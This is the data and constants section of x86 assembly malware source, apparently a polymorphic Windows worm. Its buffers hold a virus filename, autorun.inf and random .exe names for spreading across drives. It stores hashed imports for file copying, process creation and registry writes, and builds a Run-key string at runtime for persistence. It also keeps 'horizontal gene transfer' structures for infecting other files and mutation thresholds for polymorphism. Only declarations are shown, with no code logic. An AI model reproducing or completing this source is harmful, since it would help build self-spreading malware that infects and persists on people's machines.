; ############################################################################
; ############################################################################
; #####
; ##### CONSTANT DEFINITION
; #####

  StartCodon EQU 0x98
  StopCodon  EQU 0xB0

  CodeStart EQU 0x600

  ; One out of n bytes will be changed: 7 > n > (2^32 - 1)

					      ; THIS SHOULD BE A PRIME
					      ; FOR GOOD RANDOMNESS!
  IntronInsertThreshold EQU 5

  VarThreshold1 	EQU 15013
  xchgThreshold1	EQU 100003
  InsertThreshold1	EQU 5
  HGTThreshold1 	EQU 5

; #####
; ##### CONSTANT DEFINITION
; #####
; ############################################################################
; ############################################################################




; ############################################################################
; ############################################################################
; #####
; #####   DATA
; #####

DataOffset:
	PseudoRegC	dd 0x0		 ; Pseudo-Register, interact with nopsC and nopdC
					 ; Just for internal useage, dont use that in code!
					 ; If the relative position to DataOffset will change,
					 ; also change it in instruction_set_macro.inc in _nopdC and _nopsC-macro
					 ; (some additionals _add0001s, NOT addnumber-macro useage!)

	Place4Life	dd 0x0
	RandomNumber	dd 0x0


			db 0x0
	   Driveletter1 db 0x0
			db 0x0, 0x0	 ; buffer for ":\"

	RandomFileName: times 8 db 0x0	 ; buffer for random filename
	   rndext:	times 4 db 0x0	 ; .exe
			db 0x0

			db 0x0
	   Driveletter2 db 0x0
			db 0x0, 0x0	; buffer for ":\"

	   autoruninf:	times 11 db 0x0
			db 0x0


			db 0x0
	   Driveletter3 db 0x0, 0x0, 0x0     ; buffer for "C:\"

	   virusname:	times 8 db 0x0	     ; virus filename at C:
	   virext:	times 4 db 0x0	     ; .exe
			db 0x0

	RandomFileName2: times 8 db 0x0   ; buffer for random filename
	   rndext2:	 times 4 db 0x0   ; .exe
			db 0x0

	FileHandle	dd 0x0
	MapHandle	dd 0x0
	MapPointer	dd 0x0
	FileSize	dd 0x0

	stDLLkernel32: times 12 db 0x0
		      db 0x0
	stDLLadvapi32: times 12 db 0x0
		      db 0x0

	hDLLlibrary32  dd 0x0

	hAddressTable dd 0x0
	hNamePointerTable dd 0x0
	hOrdinalTable dd 0x0

	APINumber dd 0x0

   APINumberKernel EQU (APIMagicNumbersKernelEnd-APIMagicNumbersKernel)/4
   APINumberAdvapi EQU (APIMagicNumbersRegEnd-APIMagicNumbersReg)/4

	APITmpBuffer dd 0x0
	hMagicNumberPointer dd 0x0

   APIMagicNumbersKernel:
	mCloseHandle dd 0x0 ; 0x0342
	mCopyFileA   dd 0x0 ; 0x0C5C
	mCreateFileA dd 0x0 ; 0x0615
	mCreateFileMappingA dd 0x0 ; 0x04E1
	mCreateProcessA   dd 0x0 ; 0x0674
	mGetDriveTypeA	  dd 0x0 ; 0x0AFD
	mGetCommandLineA  dd 0x0 ; 0x06A8
	mGetFileSize	  dd 0x0 ; 0x083B
	mWriteFile	  dd 0x0 ; 0x078B
	mGetTickCount	  dd 0x0 ; 0x01B4
	mMapViewOfFile	  dd 0x0 ; 0x05EE
	mSleep		  dd 0x0 ; 0x07F9
	mFindFirstFileA   dd 0x0 ; 0x094A
	mFindNextFileA	  dd 0x0 ; 0x0FE1
	mUnmapViewOfFile  dd 0x0 ; 0x01D1
	mSetErrorMode	  dd 0x0 ; 0x0CBB
   APIMagicNumbersKernelEnd:

   APIMagicNumbersReg:
	mRegCreateKeyA	  dd 0x0 ; 0x0EDC
	mRegSetValueExA   dd 0x0 ; 0x0845
;        mRegCloseKey      dd 0x0F3D
   APIMagicNumbersRegEnd:


	hAddressePointer dd 0x0
   APIAddresses:
	hCloseHandle dd 0x0
	hCopyFileA   dd 0x0
	hCreateFileA dd 0x0
	hCreateFileMappingA dd 0x0
	hCreateProcessA   dd 0x0
	hGetDriveTypeA	  dd 0x0
	hGetCommandLineA  dd 0x0
	hGetFileSize	  dd 0x0
	hWriteFile	  dd 0x0
	hGetTickCount	  dd 0x0
	hMapViewOfFile	  dd 0x0
	hSleep		  dd 0x0
	hFindFirstFileA   dd 0x0
	hFindNextFileA	  dd 0x0
	hUnmapViewOfFile  dd 0x0
	hSetErrorMode	  dd 0x0

   APIAddressesReg:
	hRegCreateKeyA	  dd 0x0
	hRegSetValueExA   dd 0x0
;        hRegCloseKey      dd 0x0



	xchgBuffer dd 0x0

	InsStart dd 0x0
	InsEnd	 dd 0x0
	nBlockSize	dd 0x0
	nByteBlockToMov dd 0x0

	stSubKey: times 46 db 0x0 ; SOFTWARE\Microsoft\Windows\CurrentVersion\Run
				  ; will be created at runtime

	hRegKey dd 0x0

	AutoStartContentStart: times 51 db 0x0
	AutoStartContentEnd:




StartUp_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0


ProcessInfo_struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0




; *********************************
; *** Horizontal_gene_transfer_data

WIN32_FIND_DATA_struct:
  WIN32_FIND_DATA_dwFileAttributes   dd 0
  WIN32_FIND_DATA_ftCreationTime     FILETIME
  WIN32_FIND_DATA_ftLastAccessTime   FILETIME
  WIN32_FIND_DATA_ftLastWriteTime    FILETIME
  WIN32_FIND_DATA_nFileSizeHigh      dd 0
  WIN32_FIND_DATA_nFileSizeLow	     dd 0
  WIN32_FIND_DATA_dwReserved0	     dd 0
  WIN32_FIND_DATA_dwReserved1	     dd 0
  WIN32_FIND_DATA_cFileName	     db MAX_PATH dup (0)
  WIN32_FIND_DATA_cAlternateFileName db 14 dup (0)

	HGT_searchmask	   dd 0x0

	HGT_FFHandle	   dd 0x0


	HGTFileHandle	   dd 0x0
	HGTMapHandle	   dd 0x0
	HGTMapPointer	   dd 0x0
	HGTFileSize	   dd 0x0
	HGTDidInsert	   dd 0x0

; *********************************
; *** Redundancy polymorphism

	RPAminoAcid1	dd 0x0
	RPAminoAcid2	dd 0x0

; #####
; #####   DATA
; #####
; ############################################################################
; ############################################################################
